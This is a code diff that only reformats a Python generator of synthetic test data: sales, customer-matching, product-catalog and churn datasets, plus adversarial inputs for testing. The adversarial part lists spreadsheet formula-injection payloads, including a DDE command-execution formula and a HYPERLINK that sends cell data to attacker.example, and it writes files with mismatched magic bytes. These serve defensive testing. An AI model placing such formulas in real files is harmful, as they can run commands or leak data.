@@ -50,31 +50,104 @@ CITIES = {
     "Central": ["Bhopal", "Indore", "Nagpur", "Raipur"],
 }
 CITY_ALIASES = {"Bengaluru": "Bangalore", "Mumbai": "Bombay", "Kolkata": "Calcutta", "Chennai": "Madras"}
-FIRST = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Reyansh", "Krishna", "Ishaan", "Rohan",
-         "Ananya", "Diya", "Aadhya", "Saanvi", "Pari", "Myra", "Anika", "Kavya", "Meera", "Riya",
-         "Kabir", "Dhruv", "Nikhil", "Pranav", "Tanvi", "Nisha", "Pooja", "Sneha", "Harsh", "Yash"]
-LAST = ["Sharma", "Verma", "Patel", "Iyer", "Nair", "Reddy", "Gupta", "Mehta", "Shah", "Joshi",
-        "Desai", "Kulkarni", "Banerjee", "Chatterjee", "Das", "Rao", "Menon", "Pillai", "Singh", "Kapoor"]
+FIRST = [
+    "Aarav",
+    "Vivaan",
+    "Aditya",
+    "Vihaan",
+    "Arjun",
+    "Sai",
+    "Reyansh",
+    "Krishna",
+    "Ishaan",
+    "Rohan",
+    "Ananya",
+    "Diya",
+    "Aadhya",
+    "Saanvi",
+    "Pari",
+    "Myra",
+    "Anika",
+    "Kavya",
+    "Meera",
+    "Riya",
+    "Kabir",
+    "Dhruv",
+    "Nikhil",
+    "Pranav",
+    "Tanvi",
+    "Nisha",
+    "Pooja",
+    "Sneha",
+    "Harsh",
+    "Yash",
+]
+LAST = [
+    "Sharma",
+    "Verma",
+    "Patel",
+    "Iyer",
+    "Nair",
+    "Reddy",
+    "Gupta",
+    "Mehta",
+    "Shah",
+    "Joshi",
+    "Desai",
+    "Kulkarni",
+    "Banerjee",
+    "Chatterjee",
+    "Das",
+    "Rao",
+    "Menon",
+    "Pillai",
+    "Singh",
+    "Kapoor",
+]
 EMAIL_DOMAINS = ["example.com", "example.org", "example.net", "mail.example.test"]
 
 # (category, product, base INR price, unit, pack size)
 CATALOG = [
-    ("Grocery", "Basmati Rice", 649.0, "kg", 5), ("Grocery", "Toor Dal", 189.0, "kg", 1),
-    ("Grocery", "Sunflower Oil", 899.0, "l", 5), ("Grocery", "Masala Chai", 349.0, "g", 500),
-    ("Grocery", "Atta Flour", 299.0, "kg", 5), ("Grocery", "Cashew Nuts", 499.0, "g", 500),
-    ("Electronics", "Bluetooth Earbuds", 1999.0, "pc", 1), ("Electronics", "Smart Watch", 3499.0, "pc", 1),
-    ("Electronics", "Power Bank 10000mAh", 1299.0, "pc", 1), ("Electronics", "LED Bulb 9W", 129.0, "pc", 1),
-    ("Electronics", "Wi-Fi Router", 2499.0, "pc", 1), ("Electronics", "USB-C Cable", 299.0, "pc", 1),
-    ("Apparel", "Cotton Kurta", 899.0, "pc", 1), ("Apparel", "Silk Saree", 4999.0, "pc", 1),
-    ("Apparel", "Denim Jeans", 1499.0, "pc", 1), ("Apparel", "Sports Shoes", 2799.0, "pair", 1),
-    ("Home", "Pressure Cooker 5L", 2199.0, "pc", 1), ("Home", "Steel Tiffin Box", 599.0, "pc", 1),
-    ("Home", "Cotton Bedsheet", 999.0, "pc", 1), ("Home", "Ceiling Fan", 2899.0, "pc", 1),
-    ("Beauty", "Herbal Shampoo", 249.0, "ml", 340), ("Beauty", "Sunscreen SPF50", 449.0, "ml", 100),
-    ("Beauty", "Ayurvedic Face Cream", 399.0, "g", 50), ("Beauty", "Hair Oil", 199.0, "ml", 200),
+    ("Grocery", "Basmati Rice", 649.0, "kg", 5),
+    ("Grocery", "Toor Dal", 189.0, "kg", 1),
+    ("Grocery", "Sunflower Oil", 899.0, "l", 5),
+    ("Grocery", "Masala Chai", 349.0, "g", 500),
+    ("Grocery", "Atta Flour", 299.0, "kg", 5),
+    ("Grocery", "Cashew Nuts", 499.0, "g", 500),
+    ("Electronics", "Bluetooth Earbuds", 1999.0, "pc", 1),
+    ("Electronics", "Smart Watch", 3499.0, "pc", 1),
+    ("Electronics", "Power Bank 10000mAh", 1299.0, "pc", 1),
+    ("Electronics", "LED Bulb 9W", 129.0, "pc", 1),
+    ("Electronics", "Wi-Fi Router", 2499.0, "pc", 1),
+    ("Electronics", "USB-C Cable", 299.0, "pc", 1),
+    ("Apparel", "Cotton Kurta", 899.0, "pc", 1),
+    ("Apparel", "Silk Saree", 4999.0, "pc", 1),
+    ("Apparel", "Denim Jeans", 1499.0, "pc", 1),
+    ("Apparel", "Sports Shoes", 2799.0, "pair", 1),
+    ("Home", "Pressure Cooker 5L", 2199.0, "pc", 1),
+    ("Home", "Steel Tiffin Box", 599.0, "pc", 1),
+    ("Home", "Cotton Bedsheet", 999.0, "pc", 1),
+    ("Home", "Ceiling Fan", 2899.0, "pc", 1),
+    ("Beauty", "Herbal Shampoo", 249.0, "ml", 340),
+    ("Beauty", "Sunscreen SPF50", 449.0, "ml", 100),
+    ("Beauty", "Ayurvedic Face Cream", 399.0, "g", 50),
+    ("Beauty", "Hair Oil", 199.0, "ml", 200),
 ]
 # Month multipliers: festive peak (Sep-Nov: Navratri/Diwali), wedding season (Dec-Feb), monsoon dip (Jul-Aug)
-SEASONALITY = {1: 1.05, 2: 1.0, 3: 0.95, 4: 0.9, 5: 0.92, 6: 0.88, 7: 0.8, 8: 0.85, 9: 1.15, 10: 1.45, 11: 1.4,
-               12: 1.1}
+SEASONALITY = {
+    1: 1.05,
+    2: 1.0,
+    3: 0.95,
+    4: 0.9,
+    5: 0.92,
+    6: 0.88,
+    7: 0.8,
+    8: 0.85,
+    9: 1.15,
+    10: 1.45,
+    11: 1.4,
+    12: 1.1,
+}
 
 
 # ------------------------------------------------------------------------------------------- helpers
@@ -120,7 +193,9 @@ def gen_sales(out: Path, anchor: dt.date, n_orders: int = 5000) -> dict:
     weights = []
     for i, m in enumerate(months):
         trend = 1.0 + 0.012 * i  # ~1.2 %/month growth
-        weights.append(SEASONALITY[m.month] * trend * (0.5 if m == months[-1] else 1.0))  # anchor month partial
+        weights.append(
+            SEASONALITY[m.month] * trend * (0.5 if m == months[-1] else 1.0)
+        )  # anchor month partial
     customers = [_person(rng, i) for i in range(1, 801)]
     # planted anomaly: one week with a 4x spike in Electronics/Online (to be found by anomaly detection)
     anomaly_month = months[-7]
@@ -143,11 +218,22 @@ def gen_sales(out: Path, anchor: dt.date, n_orders: int = 5000) -> dict:
         unit_price = round(price * rng.uniform(0.95, 1.08), 2)
         discount = rng.choices([0.0, 0.05, 0.1, 0.15, 0.2], [55, 15, 15, 10, 5])[0]
         revenue = round(qty * unit_price * (1 - discount), 2)
-        rows.append([
-            f"ORD-{anchor.year}-{i:06d}", day.isoformat(), cust["person_id"].replace("P", "C"),
-            f"{cust['first']} {cust['last']}", cust["region"], prod, cat, qty, f"{unit_price:.2f}",
-            f"{discount:.2f}", f"{revenue:.2f}", channel,
-        ])
+        rows.append(
+            [
+                f"ORD-{anchor.year}-{i:06d}",
+                day.isoformat(),
+                cust["person_id"].replace("P", "C"),
+                f"{cust['first']} {cust['last']}",
+                cust["region"],
+                prod,
+                cat,
+                qty,
+                f"{unit_price:.2f}",
+                f"{discount:.2f}",
+                f"{revenue:.2f}",
+                channel,
+            ]
+        )
     rows.sort(key=lambda r: (r[1], r[0]))
     # a few nulls (realistic gaps): customer_name, region, discount, channel
     for col in (3, 4, 9, 11):
@@ -157,12 +243,28 @@ def gen_sales(out: Path, anchor: dt.date, n_orders: int = 5000) -> dict:
     dups = [list(rows[idx]) for idx in rng.sample(range(len(rows)), 20)]
     for d in dups:
         rows.insert(rng.randint(0, len(rows)), d)
-    header = ["order_id", "order_date", "customer_id", "customer_name", "region", "product", "category",
-              "quantity", "unit_price", "discount", "revenue", "channel"]
+    header = [
+        "order_id",
+        "order_date",
+        "customer_id",
+        "customer_name",
+        "region",
+        "product",
+        "category",
+        "quantity",
+        "unit_price",
+        "discount",
+        "revenue",
+        "channel",
+    ]
     _write_csv(out / "sales.csv", header, rows)
     return {
-        "rows": len(rows), "unique_orders": n_orders, "exact_duplicates": 20, "currency": "INR",
-        "date_min": min(r[1] for r in rows), "date_max": max(r[1] for r in rows),
+        "rows": len(rows),
+        "unique_orders": n_orders,
+        "exact_duplicates": 20,
+        "currency": "INR",
+        "date_min": min(r[1] for r in rows),
+        "date_max": max(r[1] for r in rows),
         "anomaly_week": [min(anomaly_days).isoformat(), max(anomaly_days).isoformat()],
     }
 
@@ -174,9 +276,9 @@ def _typo(rng: random.Random, s: str) -> str:
     i = rng.randint(1, len(s) - 2)
     op = rng.choice(["swap", "drop", "double"])
     if op == "swap":
-        return s[:i] + s[i + 1] + s[i] + s[i + 2:]
+        return s[:i] + s[i + 1] + s[i] + s[i + 2 :]
     if op == "drop":
-        return s[:i] + s[i + 1:]
+        return s[:i] + s[i + 1 :]
     return s[:i] + s[i] + s[i:]
 
 
@@ -196,8 +298,18 @@ def gen_customers(out: Path) -> dict:
 
     crm_rows = []
     for p in crm_people:
-        crm_rows.append([crm_ids[p["person_id"]], p["first"], p["last"], p["email"], p["phone"], p["city"],
-                         p["dob"].isoformat(), f"{rng.uniform(1000, 250000):.2f}"])
+        crm_rows.append(
+            [
+                crm_ids[p["person_id"]],
+                p["first"],
+                p["last"],
+                p["email"],
+                p["phone"],
+                p["city"],
+                p["dob"].isoformat(),
+                f"{rng.uniform(1000, 250000):.2f}",
+            ]
+        )
     web_rows, truth = [], []
     for i, p in enumerate(web_people, 1):
         web_id = f"WEB-{i:05d}"
@@ -214,21 +326,48 @@ def gen_customers(out: Path) -> dict:
             email = email.upper() if rng.random() < 0.5 else email.replace(".", "", 1)
         city = CITY_ALIASES.get(p["city"], p["city"]) if rng.random() < 0.5 else p["city"]
         signup = dt.date(2023, 1, 1) + dt.timedelta(days=rng.randint(0, 1000))
-        web_rows.append([web_id, name, email, _phone_variant(rng, p["phone"]), city, signup.isoformat(),
-                         rng.choice(["newsletter", "organic", "ads", "referral"])])
+        web_rows.append(
+            [
+                web_id,
+                name,
+                email,
+                _phone_variant(rng, p["phone"]),
+                city,
+                signup.isoformat(),
+                rng.choice(["newsletter", "organic", "ads", "referral"]),
+            ]
+        )
         truth.append([p["person_id"], crm_ids.get(p["person_id"], ""), web_id])
     for p in crm_people:
         if p not in web_people:
             truth.append([p["person_id"], crm_ids[p["person_id"]], ""])
     truth.sort()
-    _write_csv(out / "customers_crm.csv",
-               ["crm_id", "first_name", "last_name", "email", "phone", "city", "date_of_birth", "lifetime_value_inr"],
-               crm_rows)
-    _write_csv(out / "customers_web.csv",
-               ["web_id", "full_name", "email", "mobile", "city", "signup_date", "source"], web_rows)
+    _write_csv(
+        out / "customers_crm.csv",
+        [
+            "crm_id",
+            "first_name",
+            "last_name",
+            "email",
+            "phone",
+            "city",
+            "date_of_birth",
+            "lifetime_value_inr",
+        ],
+        crm_rows,
+    )
+    _write_csv(
+        out / "customers_web.csv",
+        ["web_id", "full_name", "email", "mobile", "city", "signup_date", "source"],
+        web_rows,
+    )
     _write_csv(out / "customers_ground_truth.csv", ["person_id", "crm_id", "web_id"], truth)
-    return {"crm_rows": len(crm_rows), "web_rows": len(web_rows), "true_matches": len(overlap),
-            "people": len({t[0] for t in truth})}
+    return {
+        "crm_rows": len(crm_rows),
+        "web_rows": len(web_rows),
+        "true_matches": len(overlap),
+        "people": len({t[0] for t in truth}),
+    }
 
 
 # ------------------------------------------------------------------------------------------- products
@@ -239,8 +378,17 @@ def gen_products(out: Path) -> dict:
     for i in range(1, 201):
         cat, prod, price, unit, pack = rng.choice(CATALOG)
         brand = rng.choice(brands)
-        masters.append({"master_id": f"M{i:04d}", "brand": brand, "name": prod, "category": cat,
-                        "unit": unit, "pack": pack, "price": round(price * rng.uniform(0.8, 1.3), 2)})
+        masters.append(
+            {
+                "master_id": f"M{i:04d}",
+                "brand": brand,
+                "name": prod,
+                "category": cat,
+                "unit": unit,
+                "pack": pack,
+                "price": round(price * rng.uniform(0.8, 1.3), 2),
+            }
+        )
     unit_convert = {"kg": ("g", 1000), "l": ("ml", 1000), "g": ("kg", 0.001), "ml": ("l", 0.001)}
     a_rows, b_rows, truth = [], [], []
     a_items = rng.sample(masters, 170)
@@ -249,8 +397,17 @@ def gen_products(out: Path) -> dict:
     for n, m in enumerate(a_items, 1):
         sku = f"A-{m['category'][:3].upper()}-{n:04d}"
         a_skus[m["master_id"]] = sku
-        a_rows.append([sku, f"{m['brand']} {m['name']} {m['pack']}{m['unit']}", m["category"], m["unit"],
-                       m["pack"], f"{m['price']:.2f}", f"89{rng.randint(10**10, 10**11 - 1)}"])
+        a_rows.append(
+            [
+                sku,
+                f"{m['brand']} {m['name']} {m['pack']}{m['unit']}",
+                m["category"],
+                m["unit"],
+                m["pack"],
+                f"{m['price']:.2f}",
+                f"89{rng.randint(10**10, 10**11 - 1)}",
+            ]
+        )
     b_skus = {}
     for n, m in enumerate(b_items, 1):
         sku = f"SB/{n:05d}-{rng.choice('XYZ')}"
@@ -262,25 +419,71 @@ def gen_products(out: Path) -> dict:
         name = f"{m['name'].upper()} ({m['brand']}) {pack} {unit.upper()}"
         if rng.random() < 0.2:
             name = _typo(rng, name)
-        b_rows.append([sku, name, m["category"].lower(), f"{pack:g}", unit.upper(),
-                       f"{m['price'] * rng.uniform(0.97, 1.05):.2f}", rng.choice(["Y", "N"])])
+        b_rows.append(
+            [
+                sku,
+                name,
+                m["category"].lower(),
+                f"{pack:g}",
+                unit.upper(),
+                f"{m['price'] * rng.uniform(0.97, 1.05):.2f}",
+                rng.choice(["Y", "N"]),
+            ]
+        )
     for m in masters:
-        truth.append([m["master_id"], a_skus.get(m["master_id"], ""), b_skus.get(m["master_id"], ""),
-                      f"{m['brand']} {m['name']}", m["category"], m["unit"], m["pack"]])
-    _write_csv(out / "products_supplier_a.csv",
-               ["sku", "product_name", "category", "unit", "pack_size", "mrp_inr", "ean"], a_rows)
-    _write_csv(out / "products_supplier_b.csv",
-               ["item_code", "description", "cat", "qty_per_pack", "uom", "price", "in_stock"], b_rows)
-    _write_csv(out / "products_ground_truth.csv",
-               ["master_id", "supplier_a_sku", "supplier_b_item_code", "canonical_name", "category", "unit", "pack_size"],
-               truth)
+        truth.append(
+            [
+                m["master_id"],
+                a_skus.get(m["master_id"], ""),
+                b_skus.get(m["master_id"], ""),
+                f"{m['brand']} {m['name']}",
+                m["category"],
+                m["unit"],
+                m["pack"],
+            ]
+        )
+    _write_csv(
+        out / "products_supplier_a.csv",
+        ["sku", "product_name", "category", "unit", "pack_size", "mrp_inr", "ean"],
+        a_rows,
+    )
+    _write_csv(
+        out / "products_supplier_b.csv",
+        ["item_code", "description", "cat", "qty_per_pack", "uom", "price", "in_stock"],
+        b_rows,
+    )
+    _write_csv(
+        out / "products_ground_truth.csv",
+        [
+            "master_id",
+            "supplier_a_sku",
+            "supplier_b_item_code",
+            "canonical_name",
+            "category",
+            "unit",
+            "pack_size",
+        ],
+        truth,
+    )
     both = sum(1 for t in truth if t[1] and t[2])
-    return {"masters": len(masters), "supplier_a": len(a_rows), "supplier_b": len(b_rows), "true_matches": both}
+    return {
+        "masters": len(masters),
+        "supplier_a": len(a_rows),
+        "supplier_b": len(b_rows),
+        "true_matches": both,
+    }
 
 
 # ------------------------------------------------------------------------------------------- churn
-CHURN_COEF = {"intercept": -1.2, "tenure_months": -0.045, "monthly_spend_k": -0.18, "support_tickets": 0.42,
-              "days_since_login": 0.035, "plan_basic": 0.55, "nps": -0.09}
+CHURN_COEF = {
+    "intercept": -1.2,
+    "tenure_months": -0.045,
+    "monthly_spend_k": -0.18,
+    "support_tickets": 0.42,
+    "days_since_login": 0.035,
+    "plan_basic": 0.55,
+    "nps": -0.09,
+}
 
 
 def _auc(scores: list[float], labels: list[int]) -> float:
@@ -307,28 +510,70 @@ def gen_churn(out: Path, n: int = 3000) -> dict:
         login = rng.randint(0, 90)
         plan = rng.choices(["basic", "standard", "premium"], [0.45, 0.35, 0.2])[0]
         nps = rng.randint(0, 10)
-        z = (CHURN_COEF["intercept"] + CHURN_COEF["tenure_months"] * tenure + CHURN_COEF["monthly_spend_k"] * spend / 1000
-             + CHURN_COEF["support_tickets"] * tickets + CHURN_COEF["days_since_login"] * login
-             + CHURN_COEF["plan_basic"] * (plan == "basic") + CHURN_COEF["nps"] * nps)
+        z = (
+            CHURN_COEF["intercept"]
+            + CHURN_COEF["tenure_months"] * tenure
+            + CHURN_COEF["monthly_spend_k"] * spend / 1000
+            + CHURN_COEF["support_tickets"] * tickets
+            + CHURN_COEF["days_since_login"] * login
+            + CHURN_COEF["plan_basic"] * (plan == "basic")
+            + CHURN_COEF["nps"] * nps
+        )
         p = 1 / (1 + math.exp(-z))
         y = 1 if rng.random() < p else 0
         probs.append(p)
         labels.append(y)
-        rows.append([f"CUST-{i:05d}", tenure, f"{spend:.2f}", tickets, login, plan, nps,
-                     rng.choices(REGIONS, REGION_WEIGHTS)[0], y])
-    _write_csv(out / "churn.csv", ["customer_id", "tenure_months", "monthly_spend_inr", "support_tickets",
-                                   "days_since_login", "plan", "nps", "region", "churned"], rows)
-    meta = {"model": "logistic", "coefficients": CHURN_COEF, "rows": n, "positive_rate": round(sum(labels) / n, 4),
-            "oracle_auc": round(_auc(probs, labels), 4),
-            "note": "oracle_auc uses the TRUE probabilities: a trained model should approach but not exceed it"}
+        rows.append(
+            [
+                f"CUST-{i:05d}",
+                tenure,
+                f"{spend:.2f}",
+                tickets,
+                login,
+                plan,
+                nps,
+                rng.choices(REGIONS, REGION_WEIGHTS)[0],
+                y,
+            ]
+        )
+    _write_csv(
+        out / "churn.csv",
+        [
+            "customer_id",
+            "tenure_months",
+            "monthly_spend_inr",
+            "support_tickets",
+            "days_since_login",
+            "plan",
+            "nps",
+            "region",
+            "churned",
+        ],
+        rows,
+    )
+    meta = {
+        "model": "logistic",
+        "coefficients": CHURN_COEF,
+        "rows": n,
+        "positive_rate": round(sum(labels) / n, 4),
+        "oracle_auc": round(_auc(probs, labels), 4),
+        "note": "oracle_auc uses the TRUE probabilities: a trained model should approach but not exceed it",
+    }
     (out / "churn_meta.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")
     return meta
 
 
 # ------------------------------------------------------------------------------------------- adversarial
 FORMULA_PAYLOADS = [
-    "=1+1", "=cmd|' /C calc'!A0", "+SUM(1,2)", "-2+3", "@SUM(A1:A2)", "\t=1+1", "\r=1+1",
-    '=HYPERLINK("http://attacker.example/?x="&A1,"click")', "=IMPORTXML(CONCAT(\"http://x.example/\",A2),\"//a\")",
+    "=1+1",
+    "=cmd|' /C calc'!A0",
+    "+SUM(1,2)",
+    "-2+3",
+    "@SUM(A1:A2)",
+    "\t=1+1",
+    "\r=1+1",
+    '=HYPERLINK("http://attacker.example/?x="&A1,"click")',
+    '=IMPORTXML(CONCAT("http://x.example/",A2),"//a")',
     "-10",  # a plain negative number is NOT a formula
 ]
 
@@ -432,7 +677,9 @@ def gen_adversarial(out: Path) -> dict:
     # wrong magic bytes: content does not match the extension
     (adv / "png_as.csv").write_bytes(b"\x89PNG\r\n\x1a\n" + bytes(rng.randrange(256) for _ in range(256)))
     (adv / "text_as.xlsx").write_bytes(b"order_id,region\n1,North\n")  # not a zip
-    (adv / "mz_as.csv").write_bytes(b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 120 + b"This program cannot be run")
+    (adv / "mz_as.csv").write_bytes(
+        b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 120 + b"This program cannot be run"
+    )
     return {"zip_bomb": bomb, "formula_payloads": len(FORMULA_PAYLOADS)}
 
 
@@ -463,10 +710,14 @@ def generate(out: Path = DEFAULT_OUT, anchor: dt.date | None = None, only: list[
         "seed": SEED,
         "anchor": anchor.isoformat(),
         "stats": stats,
-        "files": {p.relative_to(out).as_posix(): {"bytes": p.stat().st_size, "sha256": _sha256(p)} for p in files},
+        "files": {
+            p.relative_to(out).as_posix(): {"bytes": p.stat().st_size, "sha256": _sha256(p)} for p in files
+        },
     }
     if not only:
-        (out / "MANIFEST.json").write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+        (out / "MANIFEST.json").write_text(
+            json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
+        )
     return manifest
 
 
